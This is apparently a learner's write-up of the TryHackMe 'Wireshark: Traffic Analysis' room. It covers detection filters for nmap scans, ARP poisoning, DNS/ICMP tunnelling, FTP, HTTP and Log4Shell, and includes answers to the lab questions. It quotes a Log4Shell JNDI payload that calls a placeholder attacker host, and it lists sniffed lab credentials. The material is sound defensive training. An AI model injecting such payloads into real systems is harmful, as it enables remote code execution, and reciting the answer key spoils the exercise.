# TryHackMe:  Wireshark: Traffic Analysis summary

Room URL: https://tryhackme.com/room/wiresharktrafficanalysis

---
# TASK-2 Nmap Scans

How can you detect **nmap** scan activity using Wireshark? 

## 🛡️ Wireshark Filters for Investigating Nmap Scans

| **Scan Type**               | **Wireshark Filter**                                                          | **Description**                                                                 |
|----------------------------|-------------------------------------------------------------------------------|---------------------------------------------------------------------------------|
| 🔹 TCP SYN Scan            | `tcp.flags.syn == 1 and tcp.flags.ack == 0`                                   | Default Nmap scan. Sends SYN packets to many ports, no handshake.              |
| 🔹 TCP Connect Scan        | `tcp.flags.syn == 1`                                                           | Full TCP connection. SYN followed by SYN/ACK and ACK.                          |
| 🔹 TCP FIN Scan            | `tcp.flags.fin == 1 and tcp.flags.syn == 0`                                   | FIN flag without SYN. Checks closed ports (per RFC).                           |
| 🔹 TCP NULL Scan           | `tcp.flags == 0x000`                                                           | No flags set. Used to bypass firewalls/IDS.                                    |
| 🔹 TCP Xmas Scan           | `tcp.flags.fin == 1 and tcp.flags.psh == 1 and tcp.flags.urg == 1`            | All "Christmas tree" flags set: FIN, PSH, URG.                                 |
| 🔸 UDP Scan                | `udp`                                                                          | Floods random UDP ports. Check for ICMP type 3 code 3 replies.                 |
| 🔸 ICMP Echo (Ping)        | `icmp.type == 8`                                                               | Used in host discovery. Echo Request packets sent to probe live hosts.         |
| 🔍 OS Detection / Fingerprinting | `tcp.options` / `ip.ttl` / `ip.flags`                                | Unusual TTL, window sizes, or TCP options (used in OS fingerprinting).         |
| 📦 Version/Service Detection | `tcp.len > 0`                                                               | Sends payloads to identify service versions.                                   |

## 🔧 Additional Tips:
- Use **Statistics → Conversations** to spot scan patterns.
- Look for a single IP targeting many ports/IPs quickly.
- Combine filters with `ip.src == [attacker IP]` for deeper inspection.


## Answer the questions below

### Q1. What is the total number of the "TCP Connect" scans?

- `tcp.flags.syn==1 and tcp.flags.ack==0 and  tcp.window_size > 1024`

Ans: ***1000***

### Q2.Which scan type is used to scan the TCP port 80?
- `tcp.port==80`
- ![Screenshot 2025-05-06 140315](https://github.com/user-attachments/assets/be4324d4-50fa-4a2e-9376-91ff365b5db9)
- the first four results are all from the same stream [see the connecting bracket], in the info section SYN, SYN ACK, ACK, RST ACK, this indicates a process of Three-way Handshake.
- TCP connect scan relies on the three-way handshake 

Ans: ***tcp connect***

### Q3. How many "UDP close port" messages are there?

- `icmp.type==3 and icmp.code==3`

Ans: ***1083***

### Q4.Which UDP port in the 55-70 port range is open?

- `!(icmp.type==3 and icmp.code==3) and (udp.dstport <= 70 and udp.dstport >= 55)`
- The result showed three destination ports [67, 68,69] 

Ans: ***68***



---
# ARP Poisoning & Man In The Middle!

## What is ARP?
ARP is used to map IP addresses (e.g., 192.168.1.1) to MAC addresses (e.g., 00:0c:29:e2:18:b4) on a local area network (LAN).

## How It Works:
1. A device wants to communicate with 192.168.1.1 but doesn’t know its MAC.
2. It sends a broadcast ARP request:
   - `"Who has 192.168.1.1? Tell 192.168.1.25"`
3. The device with IP 192.168.1.1 replies:
   - `"192.168.1.1 is at 50:78:b3:f3:cd:f4"`
4. Now the sender can create an Ethernet frame and send data directly.

## What Is an ARP Attack?
**ARP Spoofing / ARP Poisoning:**

An attacker sends fake ARP replies to fool devices into thinking they are the gateway or another trusted machine. 

## What Happens?
- Devices update their ARP table with the wrong MAC address.
- Now all traffic meant for another device (e.g., the router) is sent to the attacker instead.

**ARP activity captured:**

![Screenshot 2025-05-06 160444](https://github.com/user-attachments/assets/8d510699-127a-4c04-a4b0-f2af87d38ccc)

The image above shows an ARP Poisoning & Man In The Middle attack where: 
1. frame no 1887:
   - The attacker first sent the first Gratuitous ARP (ARP Reply without Request), to the victim machine (`.12`) whose MAC address ends with `a8`,
   - telling him that he is the router `192.168.1.1` and he changed his MAC address to `.b4`
2. frame no 1888:
   - second, the attacker sent the second Gratuitous ARP to the router (`192.168.1.1`) whose MAC address ends with `f4`,
   - telling him he is the victim `192.168.1.12` and he changed his MAC address to `.b4`
3. Now the attacker is in the middle of the router and the victim machine, attacker can:
   - Intercept packets
   - Modify or log data
   - Forward packets back and forth to stay stealthy


## Answer the questions below

### Q1.What is the number of ARP requests crafted by the attacker?

- `(arp.opcode == 1) && (arp.src.proto_ipv4 == 192.168.1.25)`

Ans: ***284***


### Q2.What is the number of HTTP packets received by the attacker?

- `(http) && (eth.dst == 00:0c:29:e2:18:b4)`

Ans: ***90***

### Q3.What is the number of sniffed username&password entries?

- `(urlencoded-form) && (http.referer == "http://testphp.vulnweb.com/login.php")`

Ans: ***6***

### Q4.What is the password of the "Client986"?

- ![Screenshot 2025-05-06 154634](https://github.com/user-attachments/assets/08bf2728-605a-40ba-b1dc-1dfd7e0a27d8)

Ans: ***clientnothere!***


### Q5.What is the comment provided by the "Client354"?

- `urlencoded-form`
- ![Screenshot 2025-05-06 154851](https://github.com/user-attachments/assets/048af5fd-5167-4884-8b0d-a2766dc6fd06)

Ans: ***Nice work!***


---
# Identifying Hosts: DHCP, NetBIOS and Kerberos


##  1. DHCP (Dynamic Host Configuration Protocol) Analysis

![Screenshot 2025-05-07 110926](https://github.com/user-attachments/assets/cba6616d-7219-4d35-b861-5234841f1502)

### **Purpose**
DHCP dynamically assigns IP addresses and other network configuration parameters to devices on a network.

### **Common Wireshark Filters**
```wireshark
bootp                     # Show all DHCP traffic (DHCP is based on BOOTP)
bootp.option.type == 53   # Filter specific DHCP message types (e.g., Discover, Offer)
bootp.hw.addr == xx:xx:xx:xx:xx:xx  # Filter by MAC address
```

### **Common DHCP Packet Types**
- DHCP Discover (client → broadcast)
- DHCP Offer (server → broadcast)
- DHCP Request (client → broadcast)
- DHCP ACK (server → broadcast or unicast)

### **Common Anomalies**
- Multiple DHCP servers offering IPs (DHCP spoofing)
- Unexpected DHCP Offer from unauthorized sources
- IP address conflicts
- DHCP ACK missing (can indicate network issues or rogue DHCP)

---

## 2. NetBIOS Name Service (NBNS) Analysis

![Screenshot 2025-05-07 110936](https://github.com/user-attachments/assets/e6db0032-f401-4761-866c-ee26d91e8fde)

### **Purpose**
NBNS is used for name resolution of NetBIOS names to IP addresses (legacy systems, Windows networking).

### **Common Wireshark Filters**
```wireshark
nbns                         # Show all NetBIOS Name Service traffic
udp.port == 137              # Specific NBNS port
nbns.flags.response == 0     # Only queries
nbns.flags.response == 1     # Only responses
```

### **Common Anomalies**
- **Broadcast storms**: Many name queries flooding the network
- **Name spoofing**: Unexpected NB names like `ISATAP<00>`, `CONVEYANCING<00>` (possibly enumeration or misconfigured hosts)
- **Duplicate name requests**: Can indicate misconfigured clients
- **Excessive queries from a single IP**: Can be indicative of scanning or malware activity

---

## 3. Kerberos Analysis

![Screenshot 2025-05-07 112025](https://github.com/user-attachments/assets/0d322617-158b-45eb-9003-45edfc587703)

### **Purpose**
Kerberos is used for authentication in Active Directory environments using ticket-based access (AS-REQ, TGS-REQ, etc.).

### **Common Wireshark Filters**
```wireshark
kerberos                    # Show all Kerberos traffic
tcp.port == 88              # Standard Kerberos port (if not using a dissector)
kerberos.CNameString        # Client username
kerberos.SNameString        # Target service/hostname
kerberos.msg_type == 10     # AS-REQ (Authentication Service Request)
kerberos.msg_type == 12     # TGS-REQ (Ticket Granting Service Request)
kerberos.error_code         # Show errors (e.g., KRB5KDC_ERR_*)
```

### **Common Anomalies**
- **Repeated AS-REQ or TGS-REQ failures**: May indicate brute-force attempts or time desync
- **KRB5KDC_ERR_PREAUTH_REQUIRED**: Normal in AS-REQ but excessive retries can signal issues
- **KRB5KDC_ERR_BADOPTION / ERR_S_PRINCIPAL_UNKNOWN**: Sign of service misconfiguration or attack
- **Username enumeration**: Multiple requests with different `cname` fields
- **Ticket requests from unexpected IPs**: May suggest lateral movement or credential misuse


## Answer the questions below

### Q1.What is the MAC address of the host "Galaxy A30"?


- `dhcp.option.hostname contains "Galaxy" `
- ![Screenshot 2025-05-07 114506](https://github.com/user-attachments/assets/b05cea59-a411-4a83-99c4-ca5d0dd7778e)


Ans: ***9a:81:41:cb:96:6c***

### Q2.How many NetBIOS registration requests does the "LIVALJM" workstation have?

- `nbns.name == "LIVALJM<00>"`

Ans: ***16***

### Q3.Which host requested the IP address "172.16.13.85"?

- `dhcp.option.requested_ip_address == 172.16.13.85`
- search in option(12) host name

Ans: ***Galaxy-A12***

### Q4.What is the IP address of the user "u5"? (Enter the address in defanged format.)

- `kerberos.CNameString contains "u5"`
- then defang the source ip of the first packet result

Ans: ***10[.]1[.]12[.]2***

### Q5.What is the hostname of the available host in the Kerberos packets?

- `kerberos.CNameString contains "$"`
- ![Screenshot 2025-05-07 120618](https://github.com/user-attachments/assets/c126dcc9-86e9-4bcc-b2de-87831e752ea3)
- `cname` field -> is the username of the client making the  Kerberos request.
- `sname` field -> is the service or host the client is trying to access. It tells you which service or hostname is being requested.


Ans: ***xp1$***

---
# Tunneling Traffic: DNS and ICMP

##  1. DNS (Domain Name System) Analysis

### What It Is
DNS translates human-readable domain names (like `www.google.com`) into IP addresses. It uses UDP port 53 by default (and TCP in some cases like zone transfers).

### 🔍 Common Wireshark Filters
- `dns` – Show all DNS traffic.
- `udp.port == 53` – DNS over UDP.
- `tcp.port == 53` – DNS over TCP.
- `dns.qry.name == "example.com"` – Show queries for a specific domain.
- `dns.flags.response == 0` – Only show DNS queries.
- `dns.flags.response == 1` – Only show DNS responses.

### 🚩 Common Anomalies to Look For
- **DNS Tunneling**: Excessive, abnormal subdomain queries (e.g., very long or encoded query names).
- **NXDOMAIN Floods**: Too many “Non-Existent Domain” responses indicating possible reconnaissance.
- **DNS Spoofing/Poisoning**: Responses with suspicious or incorrect IPs.
- **Slow Resolution**: Long response times.
- **Unexpected Port Usage**: DNS traffic on non-standard ports.


## 2. ICMP (Internet Control Message Protocol) Analysis

### What It Is
ICMP is used for diagnostic and control purposes, such as the common `ping` command. It's not used to carry user data, but to report errors and network conditions.

### 🔍 Common Wireshark Filters
- `icmp` – Show all ICMP traffic.
- `icmp.type == 8` – Echo request (ping).
- `icmp.type == 0` – Echo reply.
- `icmp.type == 3` – Destination unreachable.
- `icmp.type == 11` – Time Exceeded (e.g., from traceroute).
- `icmp.code` – Further refines the type (e.g., `icmp.type == 3 and icmp.code == 1` for "host unreachable").

### 🚩 Common Anomalies to Look For
- **ICMP Flooding**: High rate of echo requests may indicate a DoS attack.
- **Unexpected Types**: Rare ICMP message types might suggest scanning or probing.
- **TTL Exceeded**: Might indicate routing loops or traceroute activity.
- **Large ICMP Packets**: Can be used for covert channels or data exfiltration.


## Answer the questions below

### Q1.Investigate the anomalous packets. Which protocol is used in ICMP tunnelling?

- `data.len > 64 and  icmp `
- ![Screenshot 2025-05-07 123058](https://github.com/user-attachments/assets/fc4292b2-4487-48c0-8cdb-c12771fe4b39)
- look in the packet byte panel, and inspect the ASCII characters

Ans: ***ssh***

### Q2.Investigate the anomalous packets. What is the suspicious main domain address that receives anomalous DNS queries? (Enter the address in defanged format.)

- `dns.qry.name.len > 15 and !mdns and (dns.qry.type==5)`
- ![Screenshot 2025-05-07 133257](https://github.com/user-attachments/assets/a22ef87f-7060-4b3d-89f8-6dfca03c8233)


Ans: ***dataexfil[.]com***

---
# Cleartext Protocol Analysis: FTP

## FTP Overview

File Transfer Protocol (FTP) is a standard network protocol used to transfer files between a client and a server over a TCP-based network.

![Screenshot 2025-05-07 141058](https://github.com/user-attachments/assets/1df22757-e581-4625-a312-68984c4ebde5)

---

## Common FTP Attacks

| Attack Type           | Description                                                                 |
| --------------------- | --------------------------------------------------------------------------- |
| Brute Force Attack    | Repeated login attempts to guess username/password combinations.            |
| Anonymous Login Abuse | Exploiting open anonymous FTP servers to upload/download files.             |
| FTP Bounce Attack     | Using the PORT command to request the server to connect to arbitrary hosts. |
| Packet Sniffing       | FTP transmits credentials in cleartext, allowing interception.              |
| Directory Traversal   | Attempting to access restricted files by manipulating file paths.           |
| File Upload Attack    | Uploading malicious files (e.g., malware) to a writable directory.          |



## Using Wireshark to Identify FTP Anomalies

1. **Filter FTP Traffic:**

   * Use the display filter `ftp` to isolate FTP protocol communications.

2. **Inspect Credentials:**

   * Look for `USER` and `PASS` commands in plain text to detect cleartext credentials.

3. **Check for Anonymous Logins:**

   * Identify login attempts with `USER ftp` and see if `230` response codes are returned.

4. **Monitor Command Usage:**

   * Unusual commands like repeated `RETR`, `STOR`, or failed `MKD` may indicate malicious behavior.

5. **Look for Abnormal Transfers:**

   * Large or unexpected file uploads/downloads may be suspicious.

6. **Analyze Connection Behavior:**

   * Multiple EPSV/PASV connections or high-frequency commands may indicate brute force or automated attacks.

## Common FTP Commands

| Command | Description                 |
| ------- | --------------------------- |
| USER    | Specify the username        |
| PASS    | Provide the password        |
| RETR    | Retrieve (download) a file  |
| STOR    | Store (upload) a file       |
| LIST    | List files in the directory |
| PWD     | Print working directory     |
| CWD     | Change working directory    |
| MKD     | Make a new directory        |
| RMD     | Remove a directory          |
| QUIT    | End the FTP session         |


- ![Screenshot 2025-05-07 142304](https://github.com/user-attachments/assets/38f0a493-8eea-45aa-9070-14418f6af151)
- ![Screenshot 2025-05-07 142343](https://github.com/user-attachments/assets/8922859b-becf-4da7-89c7-9f7f358cb348)


## Notes

FTP is inherently insecure due to lack of encryption. Always prefer FTPS or SFTP in production environments.

## Answer the questions below

### Q1. How many incorrect login attempts are there?

- `ftp.response.code==530`

Ans: ***737***

### Q2.What is the size of the file accessed by the "ftp" account?

- `ftp.request.command=="CWD"` then follow the packet TCP stream
- ![Screenshot 2025-05-07 143348](https://github.com/user-attachments/assets/6a251c3a-8e61-4a1d-9d25-bd3890e06049)

Ans: ***39424***

### Q3.The adversary uploaded a document to the FTP server. What is the filename?

- pic
Ans: ***resume.doc***

### Q4.The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?

- ![Screenshot 2025-05-07 144028](https://github.com/user-attachments/assets/fb06659a-8aff-430d-a521-0c0a38cf3c59)

Ans: ***CHMOD 777***


---
# Cleartext Protocol Analysis: HTTP

## HTTP Analysis (in a nutshell)

**Purpose:** Inspect web traffic for suspicious or malicious activity.

### Key Focus Areas:

* **Request Methods**: Unusual `PUT`, `DELETE`, or repeated `POST` requests may be signs of attack.
* **URLs & Parameters**: Look for anomalies (e.g., `../../`, encoded payloads, SQL-like strings).
* **Headers**: Suspicious headers (e.g., malformed `Host`, `Referer`, or `User-Agent`) can indicate scanning tools.
* **Response Codes**: Lots of `401`, `403`, or `500` responses may signal probing or exploitation.
* **Payloads**: Look for signs of injection (XSS, SQLi, RCE) in POST bodies or query strings.

## User-Agent Analysis (in a nutshell)

**Purpose:** Identify bots, scanners, or spoofed clients.

### Key Indicators:

* **Outdated Versions**: User-Agents showing old Chrome, Firefox, etc., may be spoofed or vulnerable clients.
* **Tool Signatures**: User-Agents like `sqlmap`, `Nikto`, `curl`, or `python-requests` reveal automated tools.
* **Frequency & Volume**: Hundreds of requests per second with the same UA is not normal human behavior.
* **Inconsistencies**: Linux UAs with `Edge` or Safari UAs with `Windows` — often faked.

**Use Case**: Detect brute force attacks, scrapers, scanners, or malware beaconing.

## Log4j (Log4Shell) Analysis (in a nutshell)

**Vulnerability**: CVE-2021-44228 — allows **remote code execution (RCE)** by injecting JNDI payloads into loggable fields.

### How It’s Exploited:

* Attacker sends payload like:
  `${jndi:ldap://attacker.com/a}`
* Injected in HTTP headers: `User-Agent`, `Referer`, `X-Api-Version`, etc.
* If the vulnerable server logs the input without sanitization → it performs the malicious lookup.

### What to Look For:

* **Suspicious JNDI strings** in logs or packets: `${jndi:ldap://...}`, `${jndi:rmi://...}`
* **Strange HTTP headers** containing these payloads.
* **Outbound traffic** from internal systems to attacker-controlled IPs/domains (LDAP/RMI).

## Answer the questions below

### Q1. Investigate the user agents. What is the number of anomalous  "user-agent" types?

- pic
- 
- 
Ans: ******
### Q2.
Ans: ******

### Q3.Locate the "Log4j" attack starting phase. What is the packet number?

- `http.user_agent contains "jndi"`
- ![Screenshot 2025-05-07 152243](https://github.com/user-attachments/assets/4eaa5937-c21f-4377-b9cd-723e0fb2e1b3)

Ans: ***444***

### Q4.Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)


- in frame 444, there is a base64 command injected in the user_agent field
- ![Screenshot 2025-05-07 152430](https://github.com/user-attachments/assets/a56152eb-edd1-4a48-87d4-a53aba9ffe73)
- defange the ip using CyberChef website

Ans: ***62[.]210[.]130[.]250***




